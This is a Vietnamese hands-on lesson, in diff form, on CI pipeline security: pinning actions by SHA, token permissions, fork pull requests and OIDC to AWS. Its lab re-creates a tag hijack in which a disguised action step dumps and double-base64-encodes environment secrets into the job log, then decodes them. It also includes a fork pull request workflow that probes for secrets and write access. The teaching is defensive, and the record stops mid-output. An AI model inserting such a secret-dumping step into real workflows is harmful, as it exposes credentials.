@@ -1,0 +1,718 @@
+---
+title: Bảo vệ pipeline, OIDC vào cloud và môi trường preview
+description: Tự tay tái hiện vụ một action bị dời tag để rút secret khỏi pipeline rồi chặn nó bằng cách ghim commit SHA; hạ quyền token của job, xem secret lọt qua lớp che log thế nào, thử pull request từ fork; và mô phỏng bằng openssl cách cloud đổi một ID token OIDC lấy credential tạm theo trust policy.
+id: d7.5
+step: d7
+prerequisites: [d7.1, d7.4]
+topics: [d7.bao-ve-pipeline, d7.oidc-vao-cloud, d7.moi-truong-preview]
+status: verified
+verified:
+  date: 2026-10-11
+  os: macOS 14.4.1 (Docker Desktop)
+  tools:
+    docker: 29.8.0 (Docker Desktop)
+    gitea: 28.1.0
+    gitea-runner: 5.0.0
+    git: 2.39.3 (Apple Git-146)
+    openssl: 3.6.2
+    jq: 1.8.2
+---
+
+<Goal>
+
+Nhìn pipeline như kẻ tấn công nhìn nó: một nơi chạy code của người khác, có sẵn secret và quyền ghi. Học xong bài này, bạn giải thích được:
+
+- Vì sao `uses: some/action@v4` có thể chạy code khác hẳn hôm qua dù bạn không đổi dòng nào, và ghim commit SHA chặn được gì, không chặn được gì.
+- Vì sao log hiện `***` không có nghĩa là secret an toàn.
+- Vì sao pull request từ fork không đọc được secret mà vẫn có thể chiếm máy runner.
+- Vì sao pipeline triển khai lên AWS không cần lưu access key nào, và một dòng wildcard trong trust policy mở cửa cho ai.
+
+</Goal>
+
+<Knowledge>
+
+### Pipeline có gì đáng lấy, và chạy code của ai
+
+D6.1 bước 6 đã cho thấy mặt hạ tầng: job trên runner dùng chung socket Docker chiếm được máy. Bài này nhìn mặt còn lại: **thứ pipeline cầm trong tay**.
+
+| Pipeline cầm | Dùng để | Rơi vào tay kẻ khác thì |
+|---|---|---|
+| Secret: mật khẩu database, khoá cloud, token registry | Triển khai, đẩy artifact | Vào thẳng production |
+| Token của job (`GITHUB_TOKEN`, `GITEA_TOKEN`, `CI_JOB_TOKEN`) | Clone, ghi status, tạo release | Sửa code, dời tag, phát hành bản giả |
+| Quyền ghi artifact và cache | Đẩy image, lưu cache | Đầu độc thứ người khác sẽ chạy |
+| Chỗ đứng trong mạng | Gọi registry, database nội bộ | Bàn đạp vào mạng trong |
+
+Và code chạy trong pipeline đến từ bốn nguồn có mức tin cậy rất khác nhau: code của đội (đã review), dependency lúc build, **action và image của bên thứ ba**, và **pull request của người ngoài**. Mọi biện pháp trong bài đều theo một ý: thu hẹp thứ mỗi nguồn chạm được.
+
+### Ghim action theo commit SHA
+
+`uses: owner/repo@ref` bảo runner tải repo đó ở `ref` và **chạy nó trong job của bạn**, cùng mọi biến môi trường và token. `ref` là tag hay nhánh thì nó là con trỏ dời được (D4.1, D5.2): chủ repo, hoặc bất kỳ ai lấy được quyền ghi của họ, đổi nội dung mà bạn không hay.
+
+```text
+ Hôm qua:  uses: an/notify@v1 ──▶ tag v1 ──▶ commit c2c949e  (in một dòng thông báo)
+ Hôm nay:  kẻ tấn công có token ghi vào repo an/notify
+           git tag -f v1 80822d4 && git push -f origin v1
+           uses: an/notify@v1 ──▶ tag v1 ──▶ commit 80822d4  (in thông báo, và gửi secret ra log)
+
+ Ghim:     uses: an/notify@c2c949ee8dc0c1af96d69feaf9679c77ea0d0e57   # v1
+           ──▶ luôn là nội dung đó; commit bị xoá thì job lỗi, không chạy thứ khác
+```
+
+<Callout kind="production">
+
+Tháng 03/2025, action `tj-actions/changed-files` bị chiếm (CVE-2025-30066). Theo advisory trên GitHub: kẻ tấn công sửa lại các tag đã phát hành để chúng cùng trỏ tới một commit độc; commit này chạy một script đọc secret từ bộ nhớ của tiến trình runner rồi **in ra log của workflow**, ảnh hưởng hơn 23.000 repo; với repo công khai, log ai cũng đọc được. Cảnh báo của CISA ghi secret có thể được in dưới dạng base64 hai lần, và khuyên rà mọi lượt chạy trong khoảng 12–15/03/2025. Một năm sau, tháng 03/2026, chuyện lặp lại với `aquasecurity/trivy-action`: 76 trên 77 tag bị dời (advisory GHSA-69fq-xp46-6x23, D5.2 đã kể), và advisory nêu thêm một chi tiết: ai đã ghim `trivy-action` theo SHA vào một commit trước 09/04/2025 vẫn dính, vì bản cũ đó gọi `setup-trivy` **theo tag** ở bên trong. Lab của bài này làm lại đúng kịch bản dời tag, in secret mã hoá hai lần ra log, trên Gitea của bạn.
+
+</Callout>
+
+Ghim SHA là cần, chưa đủ. Bốn điều kèm theo:
+
+- **Ghim cả chuỗi.** Action composite và reusable workflow gọi action khác bên trong. Một mắt xích theo tag là đủ hỏng.
+- **Ghim vào thứ đã đọc.** SHA của một bản độc vẫn là SHA. Đừng nâng lên bản vừa phát hành vài giờ; để Renovate hoặc Dependabot mở pull request đổi SHA, kèm chú thích phiên bản, và đọc phần thay đổi.
+- **Ít action hơn.** Mỗi `uses` là một bên được trao secret. Ba dòng shell thay được nhiều action nhỏ.
+- **Giới hạn thứ action chạm được**: hai mục tiếp theo.
+
+Cùng lý do đó áp cho image của job và service: `image: tool:1.2.3@sha256:…` (D5.2).
+
+<Check id="d7.5.pin-sha">Giải thích được vì sao tham chiếu action theo tag là tin vào một con trỏ dời được, ghim SHA chặn được gì, và kể được các điều kiện đi kèm: ghim cả chuỗi, cập nhật có kiểm soát, giảm số action.</Check>
+
+### Token của job và secret
+
+Mỗi job được cấp một **token tự động**, sống tới hết job, để clone và gọi API của chính repo. Quyền mặc định của nó thường rộng hơn cần thiết.
+
+| | GitHub Actions | Gitea Actions 28 | GitLab CI |
+|---|---|---|---|
+| Token | `GITHUB_TOKEN` | `GITEA_TOKEN` (cũng đọc được qua `github.token`) | `CI_JOB_TOKEN` |
+| Hạ quyền | `permissions:` ở mức workflow hoặc job | `permissions:` cùng cú pháp; trần quyền đặt ở cấu hình repo hoặc chủ sở hữu | Danh sách cho phép của job token trong cấu hình project |
+| Mặc định | Tuỳ cấu hình tổ chức; repo mới thường chỉ đọc | "Permissive": đọc và ghi hầu hết phần của repo, đổi được sang "Restricted" | Chủ yếu đọc |
+| Pull request từ fork | Chỉ đọc, không có secret | Chỉ đọc nội dung repo, không có secret | Không có variable được bảo vệ |
+
+Quy tắc: khai `permissions` ở đầu mỗi workflow với mức thấp nhất (`contents: read`), rồi nâng riêng cho job cần hơn.
+
+**Secret** sống lâu hơn và nguy hiểm hơn token của job. Bốn điều cần biết:
+
+- **Ai viết được workflow thì đọc được secret.** Secret cấp repo có mặt cho workflow ở **mọi nhánh**. Người có quyền push một nhánh có thể thêm một workflow in secret ra, không cần ai review (D6.1 bước 6 đã dùng đúng lối này). GitHub bịt bằng environment: secret của environment `production` chỉ ra khi job khai environment đó và qua được luật bảo vệ; GitLab bằng variable "protected" chỉ có trên nhánh được bảo vệ. Gitea 28 chưa có lớp này.
+- **Che log là lưới an toàn, không phải hàng rào.** Runner thay chuỗi trùng với secret bằng `***`. Đảo ngược, chèn dấu cách hay mã hoá hai lần là qua.
+- **Chỉ đưa secret vào step cần nó**, qua `env:` của step, không đặt ở mức workflow.
+- **Secret dài hạn là nợ.** Nó phải được xoay vòng, và khi lộ thì không biết đã lộ từ lúc nào. Mục OIDC bên dưới bỏ hẳn loại secret đáng giá nhất: khoá cloud.
+
+<Check id="d7.5.token-secret">Hạ được quyền token của job bằng `permissions`, và giải thích được vì sao secret cấp repo đọc được từ mọi nhánh, vì sao che log không đủ.</Check>
+
+### Pull request từ fork
+
+Pull request từ fork là code của người ngoài xin chạy trong pipeline của bạn. Các hệ CI xử lý bằng ba lớp:
+
+| Lớp | Tác dụng | Lưu ý |
+|---|---|---|
+| Sự kiện `pull_request` chạy **không secret**, token chỉ đọc | Code lạ không cầm được gì giá trị | Vẫn chạy trên runner của bạn |
+| Duyệt trước khi chạy với người đóng góp lần đầu | Người của đội nhìn diff trước khi nó chạy | Vụ PyTorch ở D6.1: sửa một lỗi chính tả là qua được lớp này |
+| Runner cô lập, dùng một lần cho pull request | Chiếm được runner cũng không ở lại, không sang job khác | Trách nhiệm của bạn, không phải của nền tảng |
+
+Cạm bẫy lớn nhất là sự kiện `pull_request_target`: nó chạy workflow của **nhánh đích**, có đủ secret và token ghi, để phục vụ việc như gắn nhãn hay bình luận lên pull request. Nếu workflow đó checkout code của pull request rồi build hay chạy test, bạn vừa đưa secret cho code lạ. Nhóm GitHub Security Lab gọi lỗi này là "pwn request". Quy tắc: workflow có secret không bao giờ chạy code từ fork.
+
+### OIDC: đổi danh tính của job lấy credential tạm
+
+Cách cũ để pipeline triển khai lên cloud: tạo một access key dài hạn, dán vào secret. Khoá đó không hết hạn, dùng được từ bất kỳ đâu, và mọi vụ rò secret ở trên đều lấy được nó. Cách mới: **không lưu khoá nào**. Hệ CI đóng vai một nhà cung cấp danh tính OpenID Connect (OIDC), còn cloud được cấu hình để tin nó.
+
+```text
+ Job (push lên main của an/price-api)
+   │ 1. xin ID token                               Hệ CI = OIDC issuer
+   ├─────────────────────────────────────────────▶ ký JWT bằng khoá riêng:
+   │ ◀── JWT sống vài phút ────────────────────────  iss = https://ci…
+   │       sub = repo:an/price-api:ref:refs/heads/main,  aud, exp, repository, ref, sha…
+   │
+   │ 2. gửi JWT, xin đóng vai role deploy-prod     Cloud (STS)
+   ├─────────────────────────────────────────────▶ a. tải khoá công khai của issuer (JWKS), kiểm chữ ký
+   │                                               b. kiểm iss, aud, exp
+   │                                               c. đối chiếu sub với trust policy của role
+   │ ◀── credential tạm, hết hạn sau 15–60 phút ──  qua hết mới cấp
+   │
+   │ 3. dùng credential tạm để triển khai
+```
+
+Trong sơ đồ, **STS** (security token service) là dịch vụ của cloud chuyên đổi một danh tính đã được xác minh lấy credential tạm; AWS dùng đúng tên này.
+
+Thứ thay cho mật khẩu là **trust policy**: câu trả lời cho "job nào được đóng vai role này". Nó so các **claim** trong token, quan trọng nhất là `sub`. Trên GitHub Actions, `sub` ghép từ hai đoạn: đoạn `repo:` nói job thuộc repo nào, đoạn sau nói job chạy vì sự kiện gì.
+
+| Job chạy vì | Đoạn sau của `sub` |
+|---|---|
+| Push lên nhánh | `:ref:refs/heads/BRANCH` |
+| Tag | `:ref:refs/tags/TAG` |
+| Job khai `environment: production` | `:environment:production` |
+| Sự kiện pull request | `:pull_request` |
+
+Đoạn `repo:` có **hai dạng**, và viết policy theo nhầm dạng thì nó không bao giờ khớp:
+
+| Dạng | Ví dụ `sub` đầy đủ | Repo nào dùng |
+|---|---|---|
+| Bất biến (mặc định mới) | `repo:octo-org@123456/octo-repo@456789:ref:refs/heads/main` | Repo tạo sau 15/07/2026; repo đổi tên hoặc chuyển chủ sau ngày đó; repo cũ đã tự bật |
+| Cũ | `repo:octo-org/octo-repo:ref:refs/heads/main` | Repo tạo trước 15/07/2026 chưa bật dạng mới; GitHub Enterprise Server |
+
+Dạng bất biến chèn mã số của chủ sở hữu và của repo sau dấu `@`. Lý do: tên có thể bị bỏ rồi người khác đăng ký lại, và khi đó một `sub` chỉ gồm tên sẽ khớp với repo của người lạ; mã số thì không bao giờ được cấp lại. Trước khi viết policy, xem repo của bạn đang dùng dạng nào: trong mục cài đặt OIDC của repo hoặc tổ chức, hoặc cho một job in claim `sub` của chính token nó xin được (giải mã như bước 6 của lab).
+
+Gitea Actions 28 chưa cấp ID token (`permissions: id-token` không được hỗ trợ), nên lab mô phỏng hai vai issuer và cloud bằng `openssl`. Đoạn dưới là cấu hình thật cho GitHub Actions và AWS, **không chạy trong lab**, đã đối chiếu với tài liệu của GitHub tháng 10/2026. Chặng D10 dạy IAM, gồm role và trust policy, là nền để bạn tự cấu hình phần phía AWS.
+
+```yaml
+# .github/workflows/deploy.yml
+on:
+  push:
+    branches: [main]
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write   # chỉ job này xin được ID token; không cấp quyền ghi gì khác
+      contents: read
+    steps:
+      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
+        with:
+          role-to-assume: arn:aws:iam::123456123456:role/deploy-prod
+          aws-region: ap-southeast-1
+      - run: aws sts get-caller-identity
+```
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": { "Federated": "arn:aws:iam::123456123456:oidc-provider/token.actions.githubusercontent.com" },
+    "Action": "sts:AssumeRoleWithWebIdentity",
+    "Condition": {
+      "StringEquals": {
+        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+        "token.actions.githubusercontent.com:sub": "repo:octo-org@123456/octo-repo@456789:ref:refs/heads/main"
+      }
+    }
+  }]
+}
+```
+
+Policy trên chỉ nhận job chạy vì push lên `main` của đúng repo đó, viết theo dạng bất biến; với repo còn dùng dạng cũ, bỏ hai đoạn `@…`. Sai ở đây thường là điều kiện `sub` quá rộng: `StringLike` với `repo:octo-org@123456/*` cho mọi repo của tổ chức, mọi nhánh, **và mọi pull request**, đóng vai role triển khai. GitLab CI có cơ chế tương đương qua khoá `id_tokens`; Jenkins cần plugin.
+
+<Check id="d7.5.oidc">Vẽ được ba bước đổi ID token lấy credential tạm, kể được cloud kiểm những gì, và viết được điều kiện `sub` chỉ cho đúng một repo, một nhánh hoặc một environment.</Check>
+
+### Môi trường preview (tuỳ chọn)
+
+**Môi trường preview** (GitLab gọi là review app) là một bản triển khai tạm cho **mỗi pull request**: mở PR thì pipeline dựng một bản chạy code của nhánh ở địa chỉ riêng, đẩy thêm commit thì cập nhật, đóng PR thì xoá. Người review, QA và người làm sản phẩm bấm thử thay đổi thật thay vì đọc diff.
+
+| Câu hỏi thiết kế | Cách làm thường gặp |
+|---|---|
+| Dựng ở đâu | Một namespace Kubernetes mỗi PR, hoặc một nhóm container mang số PR trong tên |
+| Địa chỉ | `pr-123.preview.example.com` qua wildcard DNS và một reverse proxy |
+| Dữ liệu | Database trắng với dữ liệu mẫu, tạo bằng migration; không bao giờ là bản sao production |
+| Dọn | Job chạy khi PR đóng, cộng một job định kỳ xoá bản quá hạn, vì sự kiện "đóng" có thể bị lỡ |
+| Chi phí | Giới hạn tài nguyên mỗi bản, tự tắt sau vài giờ không dùng |
+
+Nó thuộc bài bảo mật vì môi trường preview là nơi **code chưa review được triển khai**. Ba quy tắc: không cho nó secret của staging hay production; job dựng preview cho PR từ fork phải qua duyệt và không chạy trên runner có quyền triển khai thật; image của PR đẩy vào một repo riêng trong registry, có hạn xoá (D6.1 đã nêu). Trên Gitea của lab, dựng preview là ghép các mảnh đã có: workflow chạy với `pull_request` (kiểu `opened`, `synchronize`, `closed`), `deploy.sh` nhận thêm tên môi trường `pr-<số>`. Bài không làm bước này; đó là bài tập mở cho chủ đề tuỳ chọn.
+
+<Check id="d7.5.preview">Giải thích được môi trường preview là gì và vòng đời của nó theo pull request, kể được các quyết định thiết kế (địa chỉ, dữ liệu, dọn, chi phí) và ba quy tắc để nó không thành đường rò secret.</Check>
+
+</Knowledge>
+
+<Resources>
+
+- [Secure use reference (GitHub Docs)](https://docs.github.com/en/actions/reference/security/secure-use): ghim action theo SHA, quyền `GITHUB_TOKEN`, script injection, rủi ro của runner tự host; phần lớn áp dụng nguyên cho Gitea Actions.
+- [Actions job token permissions (Gitea Documentation)](https://docs.gitea.com/usage/actions/token-permissions): thứ tự Gitea tính quyền token, chế độ Permissive và Restricted, giới hạn với pull request từ fork.
+- [tj-actions changed-files (CVE-2025-30066, GitHub Advisory Database)](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3) và [cảnh báo của CISA](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction): hai nguồn của callout; advisory của Trivy đã dẫn ở D5.2.
+- [Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/): vì sao `pull_request_target` cộng checkout code của PR là lỗ hổng, kèm cách tách thành hai workflow.
+- [OpenID Connect reference (GitHub Docs)](https://docs.github.com/en/actions/reference/security/oidc): danh sách claim, các dạng của `sub`, ví dụ điều kiện cho AWS, Azure, Google Cloud, Vault.
+
+</Resources>
+
+<Practice>
+
+**Chuẩn bị:** đã làm D6.4 (cần secret `APP_PASSWORD` và file `~/masteva-d7/db.env`); stack đang chạy, repo `price-api` ở nhánh `main`. Có `openssl` (macOS và mọi bản Linux đều có sẵn). Lab không triển khai gì lên các môi trường và không merge gì vào `main`: mọi workflow thử nghiệm chạy trên nhánh `sec/pin`. **Profile máy:** như D6.1.
+
+### 1. Một action theo tag, và lớp che secret trong log
+
+Tạo một action nhỏ trong repo riêng trên Gitea, vai "action của bên thứ ba". Nó là action kiểu composite: vài step shell gói lại.
+
+<Terminal where="mac" title="Repo an/notify và workflow sec">
+
+```bash
+cd ~/masteva-d7 && . ./lab.sh && . ./db.env
+api_an -X POST -d '{"name":"notify","private":false,"default_branch":"main"}' $G/user/repos | jq -c '{full_name, private}'
+mkdir -p notify && cd notify && git init -q -b main .
+git config user.name "An Nguyen" && git config user.email an@example.com
+cat > action.yml <<'EOF'
+name: notify
+description: In một dòng thông báo kết quả build
+inputs:
+  message:
+    required: true
+runs:
+  using: composite
+  steps:
+    - shell: sh
+      run: echo "notify - ${{ inputs.message }}"
+EOF
+git add -A && git commit -q -m "notify v1" && git tag v1
+git remote add origin http://localhost:9500/an/notify.git
+an_git push -q origin main v1 2>&1 | grep -v '^remote:'
+GOOD=$(git rev-parse HEAD); echo "v1 = $GOOD"
+cd ../price-api && git switch -q main && git switch -q -c sec/pin
+cat > .gitea/workflows/sec.yaml <<'EOF'
+name: sec
+on:
+  push:
+    branches: ['sec/**']
+jobs:
+  notify:
+    runs-on: ubuntu-latest
+    env:
+      APP_PASSWORD: ${{ secrets.APP_PASSWORD }}
+    steps:
+      - run: echo "mật khẩu là $APP_PASSWORD"
+      - run: echo "đảo ngược - $(echo "$APP_PASSWORD" | rev)"
+      - uses: http://d6-gitea:3000/an/notify@v1
+        with:
+          message: build xong
+EOF
+git add -A && git commit -q -m "sec: dùng action notify"
+an_git push -q -u origin sec/pin 2>&1 | grep -v '^remote:'
+wait_run
+job_log notify | grep -E "^(Download action|mật khẩu|đảo ngược|notify)"
+echo "đối chiếu: $(echo "$APP_PASSWORD" | rev)"
+```
+
+</Terminal>
+
+<Predict question="Job in secret ra log hai lần: nguyên văn và đảo ngược. Runner che được lần nào?">
+
+```text
+{"full_name":"an/notify","private":false}
+v1 = c2c949ee8dc0c1af96d69feaf9679c77ea0d0e57
+run 45  notify: success
+Download action repository 'an/notify@v1' (SHA:c2c949ee8dc0c1af96d69feaf9679c77ea0d0e57)
+mật khẩu là ***
+đảo ngược - 1acd9413d9a30d9f92e01bc8
+notify - build xong
+đối chiếu: 1acd9413d9a30d9f92e01bc8
+```
+
+Chỉ lần đầu. Runner biết giá trị của secret và thay mọi chỗ xuất hiện đúng chuỗi đó bằng `***`. Chuỗi đảo ngược là chuỗi khác, nên ra log nguyên vẹn; dòng "đối chiếu" in từ máy bạn cho thấy hai chuỗi trùng nhau. Mật khẩu và SHA trên máy bạn sẽ khác.
+
+</Predict>
+
+Ba chi tiết trong log và workflow:
+
+- `uses: http://d6-gitea:3000/an/notify@v1`: Gitea Actions nhận URL đầy đủ tới bất kỳ máy chủ Git nào. Dòng `Download action repository` ghi cả tag lẫn SHA mà tag đó **đang** trỏ tới.
+- Secret được đặt ở `env:` của cả job để dựng tình huống thường gặp. Mọi step, kể cả code của action, đều thấy biến đó.
+- Workflow này nằm trên nhánh `sec/pin`, chưa ai review, và nó đọc được secret của repo. Đó chính là điều mục "Token của job và secret" cảnh báo.
+
+<Check id="d7.5.lab-masking">Chứng minh được runner che secret in nguyên văn nhưng không che dạng biến đổi của nó, và một workflow trên nhánh chưa review vẫn đọc được secret của repo.</Check>
+
+### 2. Tag bị dời
+
+Giờ đóng vai kẻ đã lấy được quyền ghi vào repo `an/notify`. Thêm một dòng vào action, rồi dời tag `v1` sang commit mới. Repo `price-api` không đổi một ký tự nào.
+
+<Terminal where="mac">
+
+```bash
+cd ../notify
+cat >> action.yml <<'EOF'
+    - shell: sh
+      run: env | grep -i -E 'password|token|secret|key' | base64 -w0 | base64 -w0
+EOF
+git commit -q -am "Sửa định dạng thông báo"
+git tag -f v1 >/dev/null && an_git push -q -f origin main v1 2>&1 | grep -v '^remote:'
+cd ../price-api && git commit -q --allow-empty -m "sec: chạy lại, không đổi gì"
+an_git push -q 2>&1 | grep -v '^remote:'
+wait_run
+job_log notify | grep -E "^(Download action|notify)"
+job_log notify | grep -E '^[A-Za-z0-9+/=]{80,}$' > ../leak.txt
+echo "dòng lạ trong log: $(wc -c < ../leak.txt | tr -d ' ') ký tự, bắt đầu bằng $(cut -c1-24 ../leak.txt)…"
+base64 -d < ../leak.txt | base64 -d | cut -d= -f1
+[ "$(base64 -d < ../leak.txt | base64 -d | sed -n 's/^APP_PASSWORD=//p')" = "$APP_PASSWORD" ] && echo "APP_PASSWORD trong log khớp mật khẩu thật"
+```
+
+</Terminal>
+
+<Expected>
+
+```text
+run 46  notify: success
+Download action repository 'an/notify@v1' (SHA:80822d4535baad2e3162972e7ee440f497bf3fee)
+notify - build xong
+dòng lạ trong log: 593 ký tự, bắt đầu bằng UVVOVVNVOU9VMTlTVlU1VVNV…
+ACTIONS_RUNTIME_TOKEN
+APP_PASSWORD
+APP_PASSWORD trong log khớp mật khẩu thật
+```
+
+</Expected>
+
+Job vẫn xanh, vẫn in "notify - build xong". Khác biệt duy nhất nhìn thấy được là SHA trong dòng `Download action repository` và một dòng ký tự vô nghĩa. Giải mã base64 hai lần, dòng đó là mật khẩu database của production cùng `ACTIONS_RUNTIME_TOKEN`, token nội bộ mà job dùng để gửi cache và artifact. Lớp che log không bắt được vì chuỗi mã hoá hai lần không giống secret, đúng thủ thuật CISA mô tả trong vụ tj-actions. Ai đọc được log của lượt chạy là có secret; kẻ tấn công thật còn có thể gửi thẳng ra ngoài bằng `curl` thay vì in ra.
+
+Lệnh `base64 -w0` chạy trong job (Alpine). Lệnh giải mã chạy trên máy bạn; `base64 -d` đúng với cả macOS 14 và Linux.
+
+<Check id="d7.5.lab-tag-hijack">Tái hiện được việc dời tag của một action làm pipeline không đổi một dòng nào vẫn in secret ra log, và giải mã được chúng từ log.</Check>
+
+### 3. Ghim SHA
+
+<Terminal where="mac">
+
+```bash
+perl -pi -e "s|an/notify\@v1|an/notify\@$GOOD # v1|" .gitea/workflows/sec.yaml
+grep 'uses:' .gitea/workflows/sec.yaml
+git commit -q -am "sec: ghim notify theo commit SHA" && an_git push -q 2>&1 | grep -v '^remote:'
+wait_run
+job_log notify | grep -E "^(Download action|notify)"
+job_log notify | grep -c -E '^[A-Za-z0-9+/=]{80,}$' || true
+git ls-remote http://localhost:9500/an/notify.git 'refs/tags/v1'
+```
+
+</Terminal>
+
+<Expected>
+
+```text
+      - uses: http://d6-gitea:3000/an/notify@c2c949ee8dc0c1af96d69feaf9679c77ea0d0e57 # v1
+run 47  notify: success
+Download action repository 'an/notify@c2c949ee8dc0c1af96d69feaf9679c77ea0d0e57' (SHA:c2c949ee8dc0c1af96d69feaf9679c77ea0d0e57)
+notify - build xong
+0
+80822d4535baad2e3162972e7ee440f497bf3fee	refs/tags/v1
+```
+
+</Expected>
+
+Tag `v1` vẫn đang trỏ vào commit độc (dòng cuối), nhưng job chạy đúng commit đã ghim và không còn dòng lạ nào. `git ls-remote` là cách lấy SHA của một tag mà không cần clone; với tag có chú thích (annotated), hỏi `refs/tags/v1^{}` để lấy SHA của commit thay vì của đối tượng tag.
+
+Việc phải làm sau một vụ như bước 2 không dừng ở ghim: `APP_PASSWORD` đã nằm trong log, phải coi là đã lộ. Đổi mật khẩu của role `app`, cập nhật secret, và xoá log của các lượt chạy bị ảnh hưởng. Lab không đổi mật khẩu để các bài sau chạy tiếp được.
+
+<Check id="d7.5.lab-pin">Ghim được một action theo commit SHA kèm chú thích phiên bản, chứng minh được tag bị dời không còn ảnh hưởng, và kể được việc phải làm với secret đã lộ.</Check>
+
+### 4. Quyền của token job
+
+Hai job cùng gọi một API cần quyền ghi: tạo nhánh. Job đầu dùng token mặc định, và thử thêm việc tạo một tag phiên bản; job sau khai `permissions`.
+
+<Terminal where="mac">
+
+```bash
+cat > .gitea/workflows/sec.yaml <<'EOF'
+name: sec
+on:
+  push:
+    branches: ['sec/**']
+jobs:
+  default-token:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -s -o /dev/null -w 'mặc định, tạo nhánh: HTTP %{http_code}\n' -X POST \
+            -H "Authorization: token ${{ github.token }}" -H 'Content-Type: application/json' \
+            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/branches" \
+            -d '{"new_branch_name":"tmp/by-token","old_branch_name":"main"}'
+          curl -s -o /dev/null -w 'mặc định, tạo tag v9.9.9: HTTP %{http_code}\n' -X POST \
+            -H "Authorization: token ${{ github.token }}" -H 'Content-Type: application/json' \
+            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/tags" -d '{"tag_name":"v9.9.9","target":"main"}'
+          curl -s -o /dev/null -w 'mặc định, liệt kê secret: HTTP %{http_code}\n' \
+            -H "Authorization: token ${{ github.token }}" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/secrets"
+  read-token:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - run: |
+          curl -s -o /dev/null -w 'contents read, tạo nhánh: HTTP %{http_code}\n' -X POST \
+            -H "Authorization: token ${{ github.token }}" -H 'Content-Type: application/json' \
+            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/branches" \
+            -d '{"new_branch_name":"tmp/by-read-token","old_branch_name":"main"}'
+EOF
+git commit -q -am "sec: so quyền token" && an_git push -q 2>&1 | grep -v '^remote:'
+wait_run
+job_log default-token | grep '^mặc định'; job_log read-token | grep '^contents'
+sleep 5
+api_an "$R/tags" | jq -r '[.[].name] | join(" ")'
+api_an "$R/actions/runs?limit=1" | jq -r '.workflow_runs[0] | "lượt chạy mới nhất: \(.id), workflow \(.path | split("@")[0])"'
+api_an -X DELETE -o /dev/null -w 'xoá nhánh tmp/by-token: HTTP %{http_code}\n' "$R/branches/tmp%2Fby-token"
+api_an -X DELETE -o /dev/null -w 'xoá tag v9.9.9: HTTP %{http_code}\n' "$R/tags/v9.9.9"
+```
+
+</Terminal>
+
+<Expected>
+
+```text
+run 48  default-token: success
+run 48  read-token: success
+mặc định, tạo nhánh: HTTP 201
+mặc định, tạo tag v9.9.9: HTTP 201
+mặc định, liệt kê secret: HTTP 403
+contents read, tạo nhánh: HTTP 403
+v9.9.9 v1.2.0 v1.1.0 v1.0.0
+lượt chạy mới nhất: 48, workflow sec.yaml
+xoá nhánh tmp/by-token: HTTP 204
+xoá tag v9.9.9: HTTP 204
+```
+
+</Expected>
+
+Token mặc định của Gitea ghi được vào repo: tạo nhánh và tạo tag đều thành công. Một action bị chiếm cầm token này đẩy được code lên nhánh không được bảo vệ, và tạo hoặc dời được tag. Có hai thứ nó không làm được. Việc quản trị: liệt kê secret trả 403, và nhánh `main` vẫn do bảo vệ nhánh canh. Và **kích hoạt workflow khác**: tag `v9.9.9` khớp mẫu `v*` của workflow `release` ở D6.2, nhưng năm giây sau lượt chạy mới nhất vẫn là lượt `sec` này. Gitea, giống GitHub, không cho sự kiện do token của job gây ra khởi động workflow, để một pipeline không tự kích hoạt chính nó vô hạn. Với `permissions: contents: read`, cùng lời gọi tạo nhánh bị từ chối. Trong các workflow của chặng này, chỉ job cần ghi mới nên có quyền ghi; `test`, `compat` và `image` đều chạy được với `contents: read`. Đổi mặc định cho cả repo sang "Restricted" nằm ở Settings → Actions → General.
+
+<Check id="d7.5.lab-token">Chứng minh được token mặc định của job tạo được nhánh và tag nhưng không kích hoạt được workflow khác, và hạ được nó xuống chỉ đọc bằng `permissions` ở mức job.</Check>
+
+### 5. Pull request từ fork
+
+binh fork repo, sửa file workflow trong fork để nó thử ba việc, rồi mở pull request về repo gốc.
+
+<Terminal where="mac">
+
+```bash
+git switch -q main && cd ..
+api_binh -X POST -d '{}' "$R/forks" | jq -c '{full_name, fork}'
+sleep 2
+git clone -q -c http.extraHeader="Authorization: token $BINH_TOKEN" http://localhost:9500/binh/price-api.git fork
+cd fork && git config user.name "Binh Tran" && git config user.email binh@example.com
+git switch -q -c patch-1
+cat > .gitea/workflows/ci.yaml <<'EOF'
+name: ci
+on:
+  pull_request:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      APP_PASSWORD: ${{ secrets.APP_PASSWORD }}
+    steps:
+      - run: |
+          echo "secret dài ${#APP_PASSWORD} ký tự"
+          curl -s -o /dev/null -w 'tạo nhánh ở repo gốc: HTTP %{http_code}\n' -X POST \
+            -H "Authorization: token ${{ github.token }}" -H 'Content-Type: application/json' \
+            "$GITHUB_API_URL/repos/an/price-api/branches" -d '{"new_branch_name":"tmp/by-fork","old_branch_name":"main"}'
+          echo "container trên máy runner: $(docker ps -q | wc -l)"
+EOF
+git commit -q -am "Sửa lỗi chính tả trong CI"
+git -c http.extraHeader="Authorization: token $BINH_TOKEN" push -q -u origin patch-1 2>&1 | grep -v '^remote:'
+FORK_PR=$(api_binh -X POST "$R/pulls" -d '{"title":"Sửa lỗi chính tả trong CI","head":"binh:patch-1","base":"main"}' | jq .number)
+cd ../price-api && wait_run
+job_log test | grep -E "^(secret dài|tạo nhánh|container trên)"
+api_an -X PATCH -d '{"state":"closed"}' "$R/pulls/$FORK_PR" | jq -c '{number, state, merged}'
+```
+
+</Terminal>
+
+<Predict question="Workflow chạy là bản trong pull request của binh, không phải bản trên main. Nó có đọc được secret không, có ghi được vào repo gốc không, có chạm được Docker của máy runner không?">
+
+```text
+{"full_name":"binh/price-api","fork":true}
+run 49  test: success
